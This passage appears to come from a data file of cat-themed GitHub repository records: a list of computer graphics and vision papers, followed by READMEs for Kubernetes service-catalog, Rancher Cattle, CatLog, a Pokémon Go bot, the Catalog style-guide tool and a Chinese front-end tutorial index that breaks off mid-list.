Layered Fabrication\nHaisen Zhao, \nFanglin Gu, \nQixing Huang, \nJ. A. Garcia Galicia, \nYong Chen, \nChanghe Tu, \nBedrich Benes, \nHao Zhang, \nDaniel Cohen-Or, \nBaoquan Chen\nIn SIGGRAPH 2016\n[Paper]\n[Project]\n\n   \n\nLearning 3D Deformation of Animals from 2D Images\nAngjoo Kanazawa, \nShahar Kovalsky, \nRonen Basri, \nDavid W. Jacobs\nIn Eurographics 2016\n[Paper]\n[Project]\n\n   \n\nInfill Optimization for Additive Manufacturing--Approaching Bone-like Porous Structures\nJun Wu, \nNiels Aage, \nR\u00fcdiger Westermann, \nOle Sigmund\nIn Arxiv 2016\n[Paper]\n\n   \n\nPhysically-Accurate Fur Reflectance: Modeling, Measurement and Rendering\nLing-Qi Yan, \nChi-Wei Tseng, \nHenrik Wann Jensen, \nRavi Ramamoorthi\nIn SIGGRAPH Asia 2015\n[Paper]\n\n   \n\nBy-Example Synthesis of Structurally Sound Patterns\nJ\u00e9r\u00e9mie Dumas, \nAn Lu, \nSylvain Lefebvre, \nJun Wu, \nChristian Dick\nIn SIGGRAPH 2015\n[Paper]\n[Project]\n\n   \n\nComputational Hydrographic Printing\nYizhong Zhang, \nChunji Yin, \nChangxi Zheng, \nKun Zhou\nIn SIGGRAPH 2015\n[Paper]\n[Project]\n\n   \n\nConvolutional Wasserstein Distances: Efficient Optimal Transportation on Geometric Domains\nJustin Solomon, \nFernando de Goes, \n Gabriel Peyre, \nMarco Cuturi, \nAdrian Butscher, \nAndy Nguyen, \nTao Du, \nLeonidas Guibas\nIn SIGGRAPH 2015\n[Paper]\n\n   \n\nA System for High-Resolution Topology Optimization\nJun Wu, \nChristian Dick, \nR\u00fcdiger Westermann\nIn IEEE Transactions on Visualization and Computer Graphics 2015\n[Paper]\n[Project]\n\n   \n\nUnsupervised Visual Representation Learning by Context Prediction\nCarl Doersch, \nAbhinav Gupta, \nAlexei A. Efros\nIn ICCV 2015\n[Paper]\n[Project]\n\n   \n\nFully Convolutional Networks for Semantic Segmentation\nJon Long, \nEvan Shelhamer, \nTrevor Darrell\nIn CVPR 2015\n[Paper]\n\n   \n\nModeling Object Appearance using Context-Conditioned Component Analysis\nDaniyar Turmukhambetov, \nNeill D.F. Campbell, \nSimon J.D. Prince, \nJan Kautz\nIn CVPR 2015\n[Paper]\n[Project]\n\n   \n\nUnderstanding Image Virality\nArturo Deza, \nDevi Parikh\nIn CVPR 2015\n[Paper]\n[Project]\n\n   \n\nExtraction of the Quad Layout of a Triangle Mesh Guided by its Curve-Skeleton\nFrancesco Usai, \nMarco Livesu, \nEnrico Puppo, \nMarco Tarini, \nRiccardo Scateni\nIn ACM Transactions on Graphics (TOG) 2015\n[Paper]\n[Project]\n\n   \n\nAutomating Image Morphing using Structural Similarity on a Halfway Domain\nJing Liao, \nRodolfo Lima, \nDiego Nehab, \nHugues Hoppe, \nPedro Sander, \nJinhui Yu\nIn SIGGRAPH 2014\n[Paper]\n[Project]\n\n   \n\nAverageExplorer: Interactive Exploration and Alignment of Visual Data Collections\nJun-Yan Zhu, \nYong Jae Lee, \nAlexei A. Efros\nIn SIGGRAPH 2014\n[Paper]\n[Project]\n\n   \n\nBuild-to-Last: Strength to Weight 3D Printed Objects\nLin Lu, \nAndrei Sharf, \nHaisen Zhao, \nYuan Wei, \nQingnan Fan, \nXuelin Chen, \nYann Savoye, \nChanghe Tu, \nDaniel Cohen-Or, \nBaoquan Chen\nIn SIGGRAPH 2014\n[Paper]\n[Project]\n\n   \n\nImage Completion using Planar Structure Guidance\nJia-Bin Huang, \nSing Bing Kang, \nNarendra Ahuja, \nJohannes Kopf\nIn SIGGRAPH 2014\n[Paper]\n[Project]\n\n   \n\nRobust and Accurate Skeletal Rigging from Mesh Sequences\nBinh Huy Le, \nZhigang Deng\nIn SIGGRAPH 2014\n[Paper]\n[Project]\n\n   \n\nContext as Supervisory Signal: Discovering Objects with Predictable Context\nCarl Doersch, \nAbhinav Gupta, \nAlexei A. Efros\nIn ECCV 2014\n[Paper]\n[Project]\n\n   \n\nHalftone QR Codes\nHung-Kuo Chu, \nChia-Sheng Chang, \nRuen-Rone Lee, \nNiloy J. Mitra\nIn SIGGRAPH Asia 2013\n[Paper]\n[Project]\n\n   \n\nPainting by feature: texture boundaries for example-based image creation\nMichal Lukac, \nJakub Fiser, \nJean-Charles Bazin, \nOndrej Jamriska, \nAlexander Sorkine-Hornung, \nDaniel Sykora\nIn SIGGRAPH 2013\n[Paper]\n[Project]\n\n   \n\nRobust Inside-Outside Segmentation using Generalized Winding Numbers\nAlec Jacobson, \nLadislav Kavan, \nOlga Sorkine-Hornung\nIn SIGGRAPH 2013\n[Paper]\n[Project]\n\n   \n\nCat Basis Purrsuit\nDaniel Caturana, \nDavid Furry\nIn SIGBOVIK 2013\n[Paper]\n\n   \n\nBoundary Cues for 3D Object Shape Recovery\nKevin Karsch, \nZicheng Liao, \nJason Rock, \nJonathan T. Barron, \nDerek Hoiem\nIn CVPR 2013\n[Paper]\n\n   \n\nNear-Regular Structure Discovery Using Linear Programming\nQixing Huang, \nLeonidas Guibas, \nNiloy J. Mitra\nIn ACM Transactions on Graphics 2013\n[Paper]\n[Project]\n\n   \n\nA Vectorial Solver for Free-form Vector Gradients\nSimon Boye, \nPascal Barla, \nGael Guennebaud\nIn SIGGRAPH Asia 2012\n[Paper]\n[Project]\n\n   \n\nManifold Preserving Edit Propagation\nXiaowu Chen, \nDongqing Zou, \nQinping Zhao, \nPing Tan\nIn SIGGRAPH Asia 2012\n[Paper]\n\n   \n\nFunctional Maps: A Flexible Representation of Maps Between Shapes\nMaks Ovsjanikov, \nMirela Ben-Chen, \nJustin Solomon, \nAdrian Butscher, \nLeonidas Guibas\nIn SIGGRAPH 2012\n[Paper]\n\n   \n\nBuilding High-level Features Using Large Scale Unsupervised Learning\nQuoc Le, \nMarcAurelio Ranzato, \nRajat Monga, \nMatthieu Devin, \nKai Chen, \nGreg Corrado, \nJeff Dean, \nAndrew Ng\nIn ICML 2012\n[Paper]\n[Project]\n\n   \n\nCats and Dogs\nOmkar M Parkhi, \nAndrea Vedaldi, \nAndrew Zisserman, \nC. V. Jawahar\nIn CVPR 2012\n[Paper]\n[Project]\n\n   \n\nLearning to Localize Detected Objects\nQieyun Dai, \nDerek Hoiem\nIn CVPR 2012\n[Paper]\n\n   \n\nAnimated Construction of Line Drawings\nHongbo Fu, \nShizhe Zhou, \n Ligang Liu, \nNiloy J. Mitra\nIn SIGGRAPH Asia 2011\n[Paper]\n[Project]\n\n   \n\nNonlinear Revision Control for Images\nHsiang-Ting Chen, \nLi-Yi Wei, \nChun-Fa Chang\nIn SIGGRAPH  2011\n[Paper]\n[Project]\n\n   \n\nBlended Intrinsic Maps\nVladimir G. Kim, \nYaron Lipman, \n Thomas Funkhouser\nIn SIGGRAPH 2011\n[Paper]\n\n   \n\nOverCoat: An Implicit Canvas for 3D Painting\nJohannes Schmid, \nMartin Sebastian Senn, \nMarkus Gross, \nRobert W. Sumner\nIn SIGGRAPH 2011\n[Paper]\n[Project]\n\n   \n\nSpin Transformations of Discrete Surfaces\nKeenan Crane, \nUlrich Pinkall, \nPeter Schroder\nIn SIGGRAPH 2011\n[Paper]\n[Project]\n\n   \n\nThe Truth About Cats and Dogs\nOmkar M Parkhi, \nAndrea Vedaldi, \nC. V. Jawahar, \nAndrew Zisserman\nIn ICCV 2011\n[Paper]\n[Project]\n\n   \n\nA Coaxial Optical Scanner for Synchronous Acquisition of 3D Geometry and Surface Reflectance\nMichael Holroyd, \nJason Lawrence, \nTodd Zickler\nIn SIGGRAPH 2010\n[Paper]\n[Project]\n\n   \n\nApparent Display Resolution Enhancement for Moving Images\nPiotr Didyk, \nElmar Eisemann, \nTobias Ritschel, \nKarol Myszkowski, \nHans-Peter Seidel\nIn SIGGRAPH 2010\n[Paper]\n[Project]\n\n   \n\nStar-Contours for Efficient Hierarchical Self-Collision Detection\nSara C. Schvartzman, \nAlvaro G. Perez, \nMiguel A. Otaduy\nIn SIGGRAPH 2010\n[Paper]\n[Project]\n\n   \n\nGuided Image Filtering\nKaiming He, \nJian Sun, \nXiaoou Tang\nIn ECCV 2010\n[Paper]\n[Project]\n\n   \n\nMobius Voting for Surface Correspondence\nYaron Lipman, \nThomas Funkhouser\nIn SIGGRAPH 2009\n[Paper]\n[Project]\n\n   \n\nMoving Gradients: A Path-Based Method for Plausible Image Interpolation\nDhruv Mahajan, \nFu-Chung Huang, \nWojciech Matusik, \nRavi Ramamoorthi, \nPeter Belhumeur\nIn SIGGRAPH 2009\n[Paper]\n[Project]\n\n   \n\nExtracting Depth and Matte using a Color-Filtered Aperture\nYosuke Bando, \nBing-Yu Chen, \nTomoyuki Nishita\nIn SIGGRAPH Asia 2008\n[Paper]\n[Project]\n\n   \n\nProgrammable Aperture Photography: Multiplexed Light Field Acquisition\nChia-Kai Liang, \nTai-Hsu Lin, \nBing-Yi Wong, \nChi Liu, \nHomer Chen\nIn SIGGRAPH 2008\n[Paper]\n[Project]\n\n   \n\nStructure-Aware Halftoning\nWai-Man Pang, \nYingge Qu, \nTien-Tsin Wong, \nDaniel Cohen-Or, \nPheng-Ann Heng\nIn SIGGRAPH 2008\n[Paper]\n[Project]\n\n   \n\nStationary Features and Cat Detection\nFran\u00e7ois Fleuret, \nDonald Geman\nIn JMLR 2008\n[Paper]\n\n   \n\nCat Head Detection - How to Effectively Exploit Shape and Texture Features\nWeiwei Zhang, \nJian Sun, \nXiaoou Tang\nIn ECCV 2008\n[Paper]\n[Project]\n\n   \n\nHarmonic Skeleton for Realistic Character Animation\nGregoire Aujay, \nFranck Hetroy, \nFrancis Lazarus, \nChristine Depraz\nIn Symposium on Computer Animation 2007\n[Paper]\n[Project]\n\n   \n\nAutomatic rigging and animation of 3D characters\nIlya Baran, \nJovan Popovic\nIn SIGGRAPH 2007\n[Paper]\n[Project]\n\n   \n\nMesh Puppetry: Cascading Optimization of Mesh Deformation with Inverse Kinematics\nXiaohan Shi, \nKun Zhou, \nYiying Tong, \nMathieu Desbrun, \nHujun Bao, \nBaining Guo\nIn SIGGRAPH 2007\n[Paper]\n\n   \n\nHybrid Images\nAude Oliva, \nAntonio Torralba, \nPhilippe G. Schyns\nIn SIGGRAPH 2006\n[Paper]\n[Project]\n\n   \n\nReal-Time Video Abstraction\nHolger Winnemoller, \nSven C. Olsen, \nBruce Gooch\nIn SIGGRAPH 2006\n[Paper]\n[Project]\n\n   \n\nSpectral Surface Quadrangulation\nShen Dong, \nPeer-Timo Bremer, \nMichael Garland, \nValerio Pascucci, \nJohn C. Hart\nIn SIGGRAPH 2006\n[Paper]\n[Project]\n\n   \n\nVector Field Design on Surfaces\nEugene Zhang, \nKonstantin Mischaikow, \nGreg Turk\nIn ACM Transactions on Graphics (TOG) 2006\n[Paper]\n\n   \n\nDiscrete conformal mappings via circle patterns\nLiliya Kharevych, \nBoris Springborn, \nPeter Schroder\nIn ACM Transactions on Graphics 2006\n[Paper]\n\n   \n\nLarge mesh deformation using the volumetric graph Laplacian\nKun Zhou, \nJin Huang, \nJohn Snyder, \nXinguo Liu, \nHujun Bao, \nBaining Guo, \nHeung-Yeung Shum\nIn SIGGRAPH 2005\n[Paper]\n\n   \n\nTextureMontage: Seamless Texturing of Arbitrary Surfaces From Multiple Images\nKun Zhou, \nXi Wang, \nYiying Tong, \nMathieu Desbrun, \nBaining Guo, \nHeung-Yeung Shum\nIn SIGGRAPH 2005\n[Paper]\n\n   \n\nDeformation Transfer for Triangle Meshes\nRobert W. Sumner, \nJovan Popovic\nIn SIGGRAPH 2004\n[Paper]\n[Project]\n\n   \n\nStereological Techniques for Solid Textures\nRobert Jagnow, \nJulie Dorsey, \nHolly Rushmeier\nIn ACM Transactions on Graphics (TOG) 2004\n[Paper]\n[Project]\n\n   \n\nA Procedural Approach to Authoring Solid Models\nBarbara Cutler, \nJulie Dorsey, \nLeonard McMillan, \nMatthias Mueller, \nRobert Jagnow\nIn SIGGRAPH 2002\n[Paper]\n[Project]\n\n   \n\nFeature-based light field morphing\nZhunping Zhang, \n Lifeng Wang, \n Baining Guo, \nHeung-Yeung Shum\nIn SIGGRAPH 2002\n[Paper]\n\n   \n\nSynthesis of Bidirectional Texture Functions on Arbitrary Surfaces\nXin Tong, \nJingdan Zhang, \n Ligang Liu, \nXi Wang, \nBaining Guo, \n Heung-Yeung Shum\nIn SIGGRAPH 2002\n[Paper]\n\n   \n\nSmoothing an Overlay Grid to Minimize Linear Distortion in Texture Mapping\nAlla Sheffer, \nEric de Sturler\nIn ACM Transactions on Graphics (TOG) 2002\n[Paper]\n\n   \n\nA Signal-Processing Framework for Inverse Rendering\nRavi Ramamoorthi, \nPat Hanrahan\nIn SIGGRAPH 2001\n[Paper]\n[Project]\n\n   \n\nReal-Time Fur over Arbitrary Surfaces\nJerome E. Lengyel, \nEmil Praun, \nAdam Finkelstein, \nHugues Hoppe\nIn SIGGRAPH 2001\n[Paper]\n\n   \n\nTexture Synthesis over Arbitrary Manifold Surfaces\nLi-Yi Wei, \nMarc Levoy\nIn SIGGRAPH 2001\n[Paper]\n[Project]\n\n   \n\nA Markovian framework for digital halftoning\nRobert Geist, \nRobert Reynolds, \nDarrell Suggs\nIn ACM Transactions on Graphics (TOG) 1993\n[Paper]\n\n   \n\nSome informational aspects of visual perception\nFred Attneave\nIn Psychological Review 1954\n[Paper]\n\n\nLast updated in Dec 2018"}, {"title": "kubernetes-incubator/service-catalog", "language": "Go", "content": "service-catalog\n\n\n\n\n\n\n\nService Catalog lets you provision cloud services directly from the comfort of native Kubernetes tooling.\nThis project is in incubation to bring integration with service\nbrokers to the Kubernetes ecosystem via the Open Service Broker API.\nDocumentation\nOur goal is to have extensive use-case and functional documentation.\nSee the Service Catalog documentation\non the main Kubernetes site, and svc-cat.io.\nFor details on broker servers that are compatible with this software, see the\nOpen Service Broker API project's Getting Started guide.\nVideo links\n\nService Catalog Intro\nService Catalog Deep-Dive\nService Catalog Basic Demo\nSIG Service Catalog Meeting Playlist\n\n\nProject Status\nWe are currently working toward a beta-quality release to be used in conjunction with\nKubernetes 1.9. See the\nmilestones list\nfor information about the issues and PRs in current and future milestones.\nThe project roadmap\ncontains information about our high-level goals for future milestones.\nWe are currently making weekly releases; see the\nrelease process\nfor more information.\nTerminology\nThis project's problem domain contains a few inconvenient but unavoidable\noverloads with other Kubernetes terms. Check out our terminology page\nfor definitions of terms as they are used in this project.\nContributing\nInterested in contributing? Check out the contribution guidelines.\nAlso see the developer's guide for information on how to\nbuild and test the code.\nWe have a mailing list available\nhere.\nWe have weekly meetings - see\nour SIG Readme\nfor details. For meeting agendas\nand notes, see Kubernetes SIG Service Catalog Agenda.\nPrevious meeting notes are also available:\n2016-08-29 through 2017-09-17.\nKubernetes Incubator\nThis is a Kubernetes Incubator project.\nThe project was established 2016-Sept-12. The incubator team for the project is:\n\nSponsor: Brian Grant (@bgrant0607)\nChampion: Paul Morie (@pmorie)\nSIG: sig-service-catalog\nOur SIG Charter\n\nFor more information about sig-service-catalog, such as meeting times and agenda,\ncheck out the community site.\nCode of Conduct\nParticipation in the Kubernetes community is governed by the\nKubernetes Code of Conduct."}, {"title": "rancher/cattle", "language": "Java", "content": "Cattle \nCattle is the orchestration engine that powers Rancher.  Its primary role is meta data management and orchestration of external systems.  Cattle in fact does no real work, but instead delegates to other components (agents) to do the actual work.  You can look at Cattle as the middle management layer in Rancher.  Do middle managers really do anything?\nRunning\nYou probably just want to run Rancher and not Cattle directly.\nDeveloping\nIf you are a brave soul and want to hack on Cattle instructions for setting up a development environment and understanding how it works are at the Rancher Wiki\nLicense\nCopyright (c) 2014-2015 Rancher Labs, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "nolanlawson/Catlog", "language": "Java", "content": "CatLog \nGraphical log reader for Android.\nNote: this repo is unmaintained due to me having too little time and too little interest. Please check out a fork called MatLog that is optimized for newer devices.\nAuthor\nNolan Lawson\nLicense\nWTFPL, although attribution would be nice.\n\nOverview\nCatLog is a free and open-source log reader for Android.\nIt shows a scrolling (tailed) view of the Android \"Logcat\" system log,\nhence the goofy name.  It also allows you to record logs in real time, send logs via email,\nand filter using a variety of criteria.\nDownload\nCatLog may be downloaded from the Google Play Store.\nYou can also find a direct APK download link from the CatLog page on my web site.\nFAQs\nWhere are the logs saved?\nOn the SD card, under /sdcard/catlog/saved_logs/.\nI can't see any logs!\nThis problem typically shows up on custom ROMs.  First off, try an alternative logging app, to verify that\nthe problem is with your ROM and not CatLog.\nNext, see if your ROM offers system-wide settings to disable logging.  Be sure to reboot after you change anything.\nIf that still doesn't work, you can contact the creator of your ROM to file a bug/RFE.\nAnd if you don't have root, check to see if you're running Jelly Bean (Android 4.2+).  CatLog has issues with unrooted Jelly Bean.\nDetails\nYou can read all about CatLog in my blog posts."}, {"title": "Lunat1q/Catchem-PoGo", "language": "Java", "content": "PROJECT IS FROZEN! Details in the discord.\n\nRights / Legal\nThis Bot is in no way affiliated with, authorized, maintained, sponsored or endorsed by Niantic, The Pok\u00e9mon Company, Nintendo or any of its affiliates or subsidiaries. This is an independent and unofficial API for educational use ONLY. Use at your own risk."}, {"title": "interactivethings/catalog", "language": "JavaScript", "content": "\ud83d\udea7 This is the currently in-development v4 branch. Stable code is in master.\n\nCatalog\nCatalog lets you create beautiful living and fully interactive style guides using Markdown and React components.\nPlease read the Catalog documentation (built with Catalog!) for detailed installation and usage instructions.\nInstallation\nyarn\nyarn add catalog react react-dom\n\nnpm\nnpm install catalog react react-dom --save\n\nDevelopment\n\nPlease make sure that you have Node >= 6 and yarn installed.\n\nBuild process\nStart the build process in watch mode:\nmake\n\nDocs\nTo edit Catalog documentation, run:\nmake docs\n\n\nNote: this uses the local Catalog build from dist/. Run make before/alongside make docs.\n\nLinking\nWhen developing Catalog you want to link it locally:\nyarn link\n\nYou can then link to this version in your project (or one of the examples):\nyarn link catalog\n\nTests\nTo run Jest tests in watch mode:\nmake test-watch\n\nCreating a Release\nBump Catalog's version:\nmake version\n\nThen push including tags:\ngit push && git push --tags\n\nThe CI server will automatically run tests, build and publish the new version to npm\nCI commands\n\nThese usually run automatically on the CI server\n\nCreate a build\nmake build\n\nCreate a documentation build\nmake build-docs\n\nPublish to npm and generate GitHub release notes\nmake publish\n\nCredits\nCatalog is developed by many people at Interactive Things, a User Experience and Data Visualization Studio based in Z\u00fcrich."}, {"title": "windiest/Front-end-tutorial", "language": "JavaScript", "content": "\ud83d\ude3aThese share data are from my usual work and learning\uff0choping to help you\uff0cIf you like you can star\n\u66f4\u591a\u8be6\u60c5\u53ef\u5173\u6ce8\u4f5c\u8005:\u5c0f\u732bwscat\u548c\u732b\u4e3b\u4ebawindiest,\u8c22\u8c22~\nJavascript\n\n\n\nArticle\nArticle\n\n\n\n\nJavascript\u6df1\u6d45\u62f7\u8d1d\nJavascript\u4e2d\u7684apply\u548ccall\u7ee7\u627f\n\n\nJavascript\u7684jsonp\u539f\u7406\nJavascript\u76d1\u542c\u89e6\u6478\u4e8b\u4ef6\n\n\nJavascript\u4e2d\u7684var self = this\nJavascript\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\n\n\nJavascript\u6ed1\u5c4f\u5207\u6362\u573a\u666f\nJavascript\u83b7\u53d6\u7ecf\u7eac\u5ea6\uff0c\u5173\u4e8e\u8c03\u7528\u767e\u5ea6API\u7684\u95ee\u9898\n\n\n\u5999\u7528Javascript\u8fd0\u7b97\u7b26\n\u6df1\u5165\u7406\u89e3Javascript\u51fd\u6570\u7f16\u7a0b\n\n\nJavascript\u7684setTimeout\u8be6\u7ec6\u7528\u4f8b\nsessionstorage\uff0clocalstorage\u548ccookie\n\n\nJS\u65e5\u671f\u5bf9\u6bd4\nJSONP\u53c2\u8003\u6587\u7ae0\n\n\nJavascript\u7684createElement\nJavascript\u7684createDocumentFragment\n\n\nsessionStorage\u548clocalStorage\n\u50cf\u7d20\u5e27\u52a8\u753b\n\n\nReference\nReference\n\n\n\u6536\u96c6\u6700\u5168\u524d\u7aef\u5b66\u4e60\u8d44\u6599\n\u6700\u5168\u524d\u7aef\u6559\u7a0b-\u732b\u7684\u56de\u5fc6\u5f55\n\n\nJavaScript\u4e2d\u7684this\u9677\u9631\u7684\u6700\u5168\u6536\u96c6--\u6ca1\u6709\u4e4b\u4e00\nJS\u51fd\u6570\u5f0f\u7f16\u7a0b\u6307\u5357\n\n\nJavaScript Promise\u8ff7\u4f60\u4e66\uff08\u4e2d\u6587\u7248\uff09\n\u962e\u4e00\u5cf0 Javascript\n\n\n\u524d\u7aef TOP 100\n\u5c0f\u767d\u7684\u96f6\u57fa\u7840JavaScript\u5168\u6808\u6559\u7a0b\n\n\n\nUI\n\n\n\nReference\nReference\n\n\n\n\nWeUI\nBootstrap\n\n\nMUI-\u6700\u63a5\u8fd1\u539f\u751fAPP\u4f53\u9a8c\u7684\u9ad8\u6027\u80fd\u524d\u7aef\u6846\u67b6\nAmaze UI\u4e2d\u56fd\u9996\u4e2a\u5f00\u6e90HTML5\u8de8\u5c4f\u524d\u7aef\u6846\u67b6\n\n\nFrozen UI\nFoundation\n\n\nSUI\nZUI\n\n\n\u6dd8\u5b9dHTML5\u524d\u7aef\u6846\u67b6\nKISSY - \u963f\u91cc\u524d\u7aefJavaScript\u5e93\n\n\n\u7f51\u6613Nej - Nice Easy Javascript\nKendo UI MVVM Demo\n\n\nSmart UI\n\u96c5\u864eUI - CSS UI\n\n\n\nCSS\n\n\n\nArticle\nArticle\n\n\n\n\nCSS Flex\u5e03\u5c40\n\u79fb\u52a8\u524d\u7aef\u5f00\u53d1CSS3\n\n\n\u54cd\u5e94\u5f0f\u5e03\u5c40 \u5a92\u4f53\u67e5\u8be2\nCSS\u56fe\u7247\u54cd\u5e94\u5f0f\u5e03\u5c40\n\n\nlessDemo\u7684less\u6587\u4ef6\n\n\n\nReference\nReference\n\n\nCSS \u8bed\u6cd5\u53c2\u8003\nCSS3\u52a8\u753b\u624b\u518c\n\n\n\u817e\u8bafcss3\u52a8\u753b\u5236\u4f5c\u5de5\u5177\nanimate.css\n\n\nAnimated Books with CSS 3D Transforms\nBrowserhacks\n\n\n\nHTML\n\n\n\nArticle\nArticle\n\n\n\n\nHTML5\u6709\u54ea\u4e9b\u8ba9\u4f60\u60ca\u8273\u7684demo\nWallpaperbetter\n\n\n\nAngular\n\n\n\nArticle\nAngular\u6587\u6863\n\n\n\n\nAngular\u6e90\u7801\u89e3\u8bfbpublishExternalAPI\u51fd\u6570\nAngular\u6e90\u7801\u89e3\u8bfbsetupModuleLoader\u51fd\u6570\n\n\nAngular\u7684ng-style\u7528\u6cd5\nAngular\u5224\u65ad\u5728\u90a3\u4e2a\u6d4f\u89c8\u5668\u4e0b\u6253\u5f00\u7684\u670d\u52a1\n\n\nAngular\u6587\u5b57\u6298\u53e0\u5c55\u5f00\u7ec4\u4ef6\u7684\u539f\u7406\u5206\u6790\nAngular\u670d\u52a1Request\u5f02\u6b65\u8bf7\u6c42\u7684\u8be6\u7ec6\u5206\u6790\n\n\nAngular\u81ea\u5b9a\u4e49service\u670d\u52a1\u8be6\u89e3\nAngular\u81ea\u5b9a\u4e49\u5224\u65ad\u4e0a\u4e00\u9875\u662f\u5426\u5b58\u5728\u7684\u670d\u52a1\n\n\nAngular\u64cd\u4f5ccookies\u65b9\u6cd5\nAngular\u6253\u5370\u9519\u8bef\u7684minErr\u51fd\u6570\n\n\nAngular\u7684fromJson\u4e0etoJson\u65b9\u6cd5\nAngular\u7528ng-repeat\u751f\u6210\u8868\u5355\u5e76\u7ed1\u5b9ang-click\u65f6\u7684\u4e00\u4e2a\u7ec6\u8282\n\n\nAngular\u7684run\u65b9\u6cd5\u5de7\u5999\u8fd0\u7528\nAngular\u5904\u7406Html\u8f6c\u4e49\u95ee\u9898\n\n\nng-repeat\u7ed1\u5b9a\u4e8b\u4ef6\u548c\u5d4c\u5957\nAngular\u7684post\u8bf7\u6c42\u540e\u53f0\u63a5\u53d7\u4e0d\u4e86\u6570\u636e\u7684\u89e3\u51b3\u65b9\u6cd5\n\n\nionic\u603b\u7ed3\nui-route\u548cng-route\n\n\nng-options&&ng-switch\ndirective\u7ec4\u4ef6\u4f5c\u7528\u57df\n\n\n\u8868\u5355\u8ba4\u8bc1\n$broadcast,$emit and $on\n\n\n\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\n\u81ea\u5b9a\u4e49\u624b\u52bf\u6307\u4ee4ng-touch\n\n\nng-animate\n\u5355\u9875\u9762\u5e94\u7528\u7684\u6280\u672f\u70b9\n\n\nGuess you like\nAppDemo\n\n\nAngular\u5546\u57ceDemo\nAngular\u7684Cnode\u793e\u533a\n\n\nAngularStovepipe\nAngular\u7684\u65b0\u95fb\u5ba2\u6237\u7aef\n\n\nAngular\u5546\u57ceDemo\nAngular\u7684Cnode\u793e\u533a\n\n\nAngular\u5185\u8054\u7f16\u8f91\u5668\nAngular\u5373\u65f6\u641c\u7d22\n\n\nAngular\u5bfc\u822a\u83dc\u5355\nAngular\u8ba2\u5355\u8868\u5355\n\n\nAngular\u5207\u6362\u7f51\u683c\nAngular\u65b0\u95fb\uff0bWEUI DEMO \u6e90\u7801\n\n\nController\n\u63a7\u5236\u5668\n\n\nAngular\u63a7\u5236\u5668demo\n\n\n\nSPA DEMO\n\u5355\u9875\u9762\u5e94\u7528\n\n\nAngular+Weui\u5355\u9875\u9762\u5e94\u7528DEMO-\u6bcf\u65e5\u7b11\u8bdd\n\n\n\nService\n\u670d\u52a1\n\n\nAngular\u81ea\u5b9a\u4e49\u670d\u52a1\u7684\u5e38\u7528\u65b9\u6cd5\nAngular\u90e8\u5206\u670d\u52a1demo\n\n\nAngular\u81ea\u5b9a\u4e49Canvas\u753b\u56fe\u670d\u52a1\nAngular\u81ea\u5b9a\u4e49http\u670d\u52a1 \u9762\u5411\u5bf9\u8c61\u5c01\u88c5\n\n\nDirective\n\u7ec4\u4ef6\u4e0e\u6307\u4ee4\n\n\nAngular\u81ea\u5b9a\u4e49\u624b\u52bf\u6307\u4ee4\nAngular\u81ea\u5b9a\u4e49\u8f6e\u64ad\u56fe\u7ec4\u4ef6\n\n\nAngular\u81ea\u5b9a\u4e49\u4e0b\u62c9\u5237\u65b0\u7ec4\u4ef61\nAngular\u81ea\u5b9a\u4e49\u4e0b\u62c9\u5237\u65b0\u7ec4\u4ef62\n\n\nRouter\n\u8def\u7531\n\n\nAngular\u8def\u7531\u5d4c\u5957\nAngular\u8def\u7531\u5355\u9875\u591a\u4e2aui-view\n\n\nFilter\n\u8fc7\u6ee4\u5668\n\n\nAngular\u81ea\u5e26\u8fc7\u6ee4\u5668\nAngular\u81ea\u5b9a\u4e49\u5173\u952e\u8bcd\u68c0\u7d22\u8fc7\u6ee4\u5668\n\n\nAnimate\n\u52a8\u753b\n\n\nAngular ng-animate\u52a8\u753b1\nAngular ng-animate\u52a8\u753b2\n\n\nOther\n\u5176\u4ed6\n\n\nAngular\u4e2d\u4f7f\u7528iframe\nAngular\u4e09\u7ea7\u8054\u52a8(1)\n\n\nAngular\u4e2d\u4f7f\u7528ng-switch\n\u767e\u5ea6\u5b9a\u4f4dDEMO\n\n\nAngular\u4e09\u7ea7\u8054\u52a8(2)\nAngular\u4e8b\u4ef6\u76d1\u542c\n\n\njQuery\u6a21\u62dfng-repeat\nlessDemo\n\n\nAngular\u81ea\u5b9a\u4e49cookie\u670d\u52a1\u548cngCookie\u7684\u4f7f\u7528\n\u56fe\u7075\u673a\u5668\u4eba\n\n\nAngular\u5229\u7528angular.module()\u5b9e\u73b0\u6a21\u5757\u5316\nAngular\u7684form\u8868\u5355\u9a8c\u8bc1\n\n\nAngular\u7684ng-repeat\u5d4c\u5957\nAngular\u5229\u7528angular.module()\u5b9e\u73b0\u6a21\u5757\u53162\n\n\nPHP\nPHP\n\n\nPHP CURL\u8bf7\u6c42\u7684\u5c0f\u7ec6\u8282\n\n\n\nReference\nReference\n\n\n\u6700\u6d41\u884c\u7684PHP \u4ee3\u7801\u89c4\u8303\n\u6700\u6d41\u884c\u7684PHP \u4ee3\u7801\u89c4\u8303\n\n\nAngular.js\u7684\u4e00\u4e9b\u5b66\u4e60\u8d44\u6e90\nAngularjs\u4e2d\u6587\u793e\u533a\n\n\n\u4e00\u4e9b\u6269\u5c55Angular UI\u7ec4\u4ef6\nAngular UI\n\n\nAngularJS\u5728\u7ebf\u6559\u7a0b\nAngular\u5b66\u4e60\u7b14\u8bb0\n\n\n\nReact\n\n\n\nReact\nReference\n\n\n\n\nReact\u6559\u7a0b \u83dc\u9e1f\u6559\u7a0b\nReact Router \u4f7f\u7528\u6559\u7a0b\n\n\nReact\u5f00\u53d1\u4e2d\u6587\u624b\u518c-\u6781\u5ba2\u5b66\u9662\nReact\u6559\u7a0b-\u6c47\u667a\u7f51\n\n\nReact.js\u5feb\u901f\u5f00\u59cb\nReactjs 2016\u6700\u4f73\u5b9e\u8df5\n\n\nReact \u5165\u95e8\u6559\u7a0b\n\u6c47\u667a\u7f51 React\u6559\u7a0b\n\n\n\u8f7b\u677e\u5165\u95e8React\u548cWebpack\nReact\u4e2d\u6587\u7d22\u5f15\n\n\nRedux \u4e2d\u6587\u6587\u6863\nReact 